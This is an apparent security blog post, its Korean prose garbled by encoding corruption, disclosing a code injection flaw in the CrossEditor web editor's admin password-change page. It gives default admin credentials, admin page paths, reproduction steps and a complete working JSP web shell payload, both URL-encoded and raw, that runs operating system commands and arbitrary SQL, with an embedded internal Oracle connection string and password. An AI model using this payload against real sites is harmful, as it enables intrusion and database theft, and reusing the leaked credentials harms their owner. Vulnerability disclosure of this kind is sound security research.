---
layout: post
title:  "í¬ë¡œìŠ¤ ì—ë””í„° (code injection)"
tags: Injection CVE
---

# í¬ë¡œìŠ¤ ì—ë””í„° (code injection)

### ì·¨ì•½ì  ê°œìš” ë° ì˜í–¥ ë²„ì „

ê³ ê°ì‚¬ ëª¨ì˜ì¹¨íˆ¬ í”„ë¡œì íŠ¸ ì§„í–‰ ì¤‘ ì‚¬ì´íŠ¸ì—ì„œ ì‚¬ìš©ì¤‘ì¸ ìƒìš© ì†”ë£¨ì…˜ í¬ë¡œìŠ¤ì—ë””í„°ê°€ ì·¨ì•½ ë²„ì „ìœ¼ë¡œ í™•ì¸ ë˜ì—ˆê³  í•´ë‹¹í•˜ëŠ” ì‚¬ì´íŠ¸ì—ì„œ íŒŒì¼ ë‹¤ìš´ë¡œë“œ ì·¨ì•½ì ì„ ì°¾ì•„ ì·¨ì•½ ì†ŒìŠ¤ì½”ë“œë¥¼ ë¶„ì„í•˜ê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤. `PoCê°€ ê³µê°œë˜ì§€ ì•Šì•„ì„œ ë‹¤ë¥¸ ëª¨ì˜í•´í‚¹ ë° ì·¨ì•½ì  ì ê²€ í”„ë¡œì íŠ¸ì—ì„œ ë°œê²¬ë˜ì§€ ëª»í•˜ê³  ì ì¬ì ìœ¼ë¡œ ë…¸í›„ëœ ì†”ë£¨ì…˜ ë²„ì „ì„ ì‚¬ìš©`í•˜ê³  ìˆì„ ê°€ëŠ¥ì„±ì´ ë†’ë‹¤ê³  ìƒê°í–ˆê³  ë°œê²¬ ì´í›„ í”„ë¡œì íŠ¸ ì§„í–‰ ì‹œ ê¸° ì·¨ì•½ì ìœ¼ë¡œ ì‰½ê²Œ ì›¹ì‰˜ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆëŠ” ê²½ìš°ê°€ ë§ì•˜ìŠµë‹ˆë‹¤.

![/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-1__.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-1__.png)

### ì·¨ì•½ ì†ŒìŠ¤ì½”ë“œ

- í¬ë¡œìŠ¤ ì—ë””í„° íŠ¹ì„± ìƒ ì‚¬ìš©ì¤‘ì¸ ì›¹ ì‹œìŠ¤í…œì— ê·¸ëŒ€ë¡œ ì†ŒìŠ¤ì½”ë“œë¥¼ integrationí•´ì•¼ í•˜ë¯€ë¡œ ë³„ë„ë¡œ DBë¥¼ êµ¬ì¶•í•  ìˆ˜ ì—†ì–´ ê´€ë¦¬ì **ê³„ì • ì •ë³´ë¥¼ ì†ŒìŠ¤ì½”ë“œë¡œ í•˜ë“œì½”ë”©í•´ì„œ ë³´ê´€**í•˜ê²Œ ë©ë‹ˆë‹¤.
- íŒ¨ìŠ¤ì›Œë“œ ë³€ê²½ ì‹œ íŒ¨ìŠ¤ì›Œë“œëŠ” ì•”í˜¸í™”ê°€ ë˜ì–´ì„œ ë³´ê´€ë˜ì§€ë§Œ id íŒŒë¼ë¯¸í„°ì˜ ê²½ìš° ì „ë‹¬ë°›ì•„ ê·¸ëŒ€ë¡œ í‰ë¬¸ìœ¼ë¡œ ì €ì¥ë©ë‹ˆë‹¤.
- ìœ„ì˜ íŠ¹ì„±ì„ í†µí•´ íŒ¨ìŠ¤ì›Œë“œ ë³€ê²½ì„ ì²˜ë¦¬í•˜ëŠ” í˜ì´ì§€ì— ìš´ì˜ì²´ì œ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ëŠ” ì†ŒìŠ¤ì½”ë“œ ì¸ì ì…˜ ì‹œ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ì²˜ë¦¬ í˜ì´ì§€ê°€ ì›¹ì‰˜ë¡œ íƒˆë°”ê¿ˆë˜ì–´ ì¹¨íˆ¬ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.

![/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-2_1_.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-2_1_.png)

### ì·¨ì•½ì  ì „ì œì¡°ê±´

1. ì·¨ì•½í•œ ë²„ì „ì„ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
- 3.5.1.38 ì´í•˜ ë²„ì „
- 4.3.2.29 ì´í•˜ ë²„ì „
1. ê´€ë¦¬ì ê³„ì •ì´ ì·¨ì•½í•´ì•¼ í•©ë‹ˆë‹¤.
- ë””í´íŠ¸ ê³„ì • ID : admin / PW : 1234
- ê¸°ë³¸ì ìœ¼ë¡œ ì„ê³„ê°’ì€ ì„¤ì •ë˜ì–´ ìˆì§€ ì•Šê¸° ë•Œë¬¸ì— ì•Œë ¤ì§„ íŒ¨ìŠ¤ì›Œë“œë¡œ ì‚¬ì „ ëŒ€ì… ê³µê²©ë„ ê³ ë ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì·¨ì•½ì  í™•ì¸ ë°©ë²•

ê¸€ì“°ê¸° ë“±ìœ¼ë¡œ ì—ë””í„° í”ŒëŸ¬ê·¸ì¸ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•˜ë‹¤ë©´ `Ctrl+Shift+A` ë¥¼ ì´ìš©í•´ì„œ ë²„ì „ í™•ì¸ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

![1-1 í¬ë¡œìŠ¤ ì—ë””í„° ë²„ì „ í™•ì¸.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-1_%ED%81%AC%EB%A1%9C%EC%8A%A4_%EC%97%90%EB%94%94%ED%84%B0_%EB%B2%84%EC%A0%84_%ED%99%95%EC%9D%B8.png)

ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ê²½ë¡œë‚˜ plugin javascript ë“±ì„ í†µí•´ì„œ í¬ë¡œìŠ¤ ì—ë””í„° ê´€ë¦¬ì í˜ì´ì§€ ê²½ë¡œë¡œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<aside>
ğŸ’¡ ì·¨ì•½ì  ë°œê²¬ ë‹¹ì‹œ í™•ì¸ ë˜ì—ˆë˜ ê´€ë¦¬ì í˜ì´ì§€ ê²½ë¡œ
/namoEditor/plugin/crossEditor/manage/index.html
/namo2/manage/index.html

</aside>

![Untitled](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/Untitled.png)

ê°„í˜¹ ê´€ë¦¬ì í˜ì´ì§€ë¥¼ ì‚­ì œí•´ì„œ ë©”ì¸ í˜ì´ì§€ì— ì ‘ê·¼í•˜ì§€ ëª»í•˜ë„ë¡ ì¡°ì¹˜ í•œ ê²½ìš°ë„ ì¡´ì¬í•©ë‹ˆë‹¤.

![1-3 ê´€ë¦¬ì í˜ì´ì§€ ë§‰í˜.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-3_%EA%B4%80%EB%A6%AC%EC%9E%90_%ED%8E%98%EC%9D%B4%EC%A7%80_%EB%A7%89%ED%9E%98.png)

ë¡œê·¸ì¸ì„ ì²˜ë¦¬í•˜ëŠ” í˜ì´ì§€ë¡œ ì§ì ‘ ì ‘ê·¼í•´ì„œ ì„¸ì…˜ì„ íšë“í•˜ë©´ ë©ë‹ˆë‹¤.

<aside>
ğŸ’¡ /namo2/manage/jsp/login_proc.jsp

</aside>

![1-4 URLë¡œ ì§ì ‘ ì ‘ê·¼.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-4_URL%EB%A1%9C_%EC%A7%81%EC%A0%91_%EC%A0%91%EA%B7%BC.png)

íšë“í•œ ì„¸ì…˜ìœ¼ë¡œ ì·¨ì•½ ëª¨ë“ˆì¸ íŒ¨ìŠ¤ì›Œë“œ ë³€ê²½ í˜ì´ì§€ë¡œ ì§ì ‘ ì ‘ê·¼í•©ë‹ˆë‹¤.

<aside>
ğŸ’¡ /namo2/manage/jsp/account_setting.jsp

</aside>

![1-5 íŒ¨ìŠ¤ì›Œë“œ ë³€ê²½ í˜ì´ì§€ ì§ì ‘ ì ‘ê·¼.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-5_%ED%8C%A8%EC%8A%A4%EC%9B%8C%EB%93%9C_%EB%B3%80%EA%B2%BD_%ED%8E%98%EC%9D%B4%EC%A7%80_%EC%A7%81%EC%A0%91_%EC%A0%91%EA%B7%BC.png)

### ì·¨ì•½ì  ì¬í˜„

Step 1) ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ì‹œ u_id íŒŒë¼ë¯¸í„°ì—  ì½”ë“œ ì¸ì ì…˜ì„ ì§„í–‰í•˜ë©´ ë©ë‹ˆë‹¤. ì½”ë“œ ì¸ì ì…˜ìœ¼ë¡œ ì†ŒìŠ¤ì½”ë“œê°€ ë³€ê²½ë˜ê¸° ë•Œë¬¸ì— ì£¼ì˜ì‚¬í•­ì´ í•„ìš”í•©ë‹ˆë‹¤.

- ì½”ë“œ ì¸ì ì…˜ ì‹œ ì»´íŒŒì¼ ì—ëŸ¬ê°€ ë°œìƒí•˜ì§€ ì•Šë„ë¡ ì˜¬ë°”ë¥¸ ì½”ë“œë¥¼ ì…ë ¥í•´ì•¼í•©ë‹ˆë‹¤.
(í…ŒìŠ¤íŠ¸ í™˜ê²½ì„ êµ¬ì¶•í•´ì„œ í…ŒìŠ¤íŠ¸í•´ë³´ê³  ê³µê²© í˜ì´ë¡œë“œë¥¼ ì…ë ¥í•˜ëŠ”ê²Œ ì•ˆì „í•©ë‹ˆë‹¤.)
- ID/PW ë³€ìˆ˜ê°€ ì†ìƒë˜ë©´ ê´€ë¦¬ì ë¡œê·¸ì¸ì´ ë¶ˆê°€ëŠ¥í•´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
    
    ![1-7.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-7.png)
    

Step 2) manageInfo.jspë¡œ ì ‘ê·¼í•´ì„œ ìš´ì˜ì²´ì œ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.

![Untitled](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/Untitled%201.png)

Step 3) manageInfo.jspì˜ ê³µê²© ì „í›„ì…ë‹ˆë‹¤.
![1-6 ë³€ê²½ ì „í›„.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-6_%EB%B3%80%EA%B2%BD_%EC%A0%84%ED%9B%84.png)

### ê³µê²© í˜ì´ë¡œë“œ

```jsx
admin";%0a%25>%0a<%25@+page+language="java"+contentType="text/html;+charset=UTF-8"+pageEncoding="UTF-8"%25>%0a<%25@+page+import="java.util.*,java.io.*"%25>%0a<meta+charset="UTF-8">%0a<form+method=GET+Action='manageInfo.jsp'>%0a<input+name='cmd'+type=text+style="width:500px;height:50px;">%0a<input+type=submit+value='Run'>%0a</Form>%0a<textarea+style="width:700px;height:500px">%0a<%25%0a%09String+cmd+=+request.getParameter("cmd");%0a%09String+output+=+"";%0a%09if(cmd+!=+null)+{%0a%09%09String+s+=null;%0a%09%09try+{%0a%09%09%09Process+p+=+Runtime.getRuntime().exec("cmd.exe+/C+"%2bcmd);%0a%09%09%09BufferedReader+sI+=+new+BufferedReader(new+InputStreamReader(p.getInputStream()));%0a%09%09%09while((s+=+sI.readLine())+!=+null)+{%0a%09%09%09%09out.println(s);%0a%09%09%09}%0a%09%09}%0a%09%09catch(IOException+e)+{%0a%09%09%09e.printStackTrace();%0a%09%09}%0a%09}%0a%25>%0a</textarea>%0a<%25%0a%09String+a+="1
```

ê³µê²© ì½”ë“œ ì›ë³¸

```java
admin";
%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.lang.*"%>
<%@ page import="java.sql.*"%>
<%@ page import="java.util.*"%>
<%@ page import="java.io.*"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<meta charset="UTF-8">
<h1> Coommand Execute </h1>
<form method=POST Action='manageInfo.jsp'>
 <input name='cmd' type=text style="width:500px;height:50px;">
 <input type=submit value='Run'>
</Form>
<br>
<textarea style="width:700px;height:500px">
<%
 String cmd = request.getParameter("cmd");
 String output = "";
 if(cmd != null) {
  String s =null;
  try {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
    while((s = sI.readLine()) != null) {
      out.println(s);
    }
  }
  catch(IOException e) {
    e.printStackTrace();
  }
 }
 %>
</textarea>
<br><br><br>
<h1> SQL Execute </h1>
<form method="GET" action="">
 <input name="query" type="text" style="width:500px; height:50px;">
 <input type="submit" value="RUN">
</form>
<br><br>
<%
 String sql = request.getParameter("query");
 if(sql != null) {
   try {
     String url = "jdbc:oracle:thin:@172.25.251.124:1721:HABISPDB";
     String user = "MATIE";
     String pass = "MATIE_20";

     Class.forName("oracle.jdbc.driver.OracleDriver");
     Connection conn = DriverManager.getConnection(url, user, pass);
     Statement stmt = conn.createStatement();
     ResultSet rs= stmt.executeQuery(sql);
     ResultSetMetaData rsmd = rs.getMetaData();
     int count = rsmd.getColumnCount();
     out.println("<br><br>");
     out.println("<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"width:500px; border: 1px solid #444444; text-align:center;\">");
     out.println("<tr>");
     for(int i=1; i<=count; i++){
       out.println("<th>"+rsmd.getColumnLabel(i)+"</th>");
     }
     out.println("</tr>");
     while(rs.next()){
       out.println("<tr>");

       for(int i=1; i<=count; i++)
       {

         switch(rsmd.getColumnType(i))
         {
           case Types.NUMERIC :
           case Types.INTEGER :
             out.println("<td>"+rs.getInt(i)+"</td>"); break;
           case Types.FLOAT :
             out.println("<td>"+rs.getFloat(i)+"</td>"); break;
           case Types.DOUBLE :
             out.println("<td>"+rs.getDouble(i)+"</td>"); break;
           case Types.DATE :
             out.println("<td>"+rs.getDate(i)+"</td>"); break;
           case Types.CHAR :
           default :
             out.println("<td>"+rs.getString(i)+"</td>");
         }
       }
       out.println("</tr>");

     }
     out.println("</table>");
     conn.close();
   }
   catch(Exception e)
   {
      out.println("<br><br>");
      out.println("not query or sql error");
   }
 }

%>
<% String a="123
```

### ì‹¤ìŠµí™˜ê²½

```bash
docker pull rbdhks9826/crs
```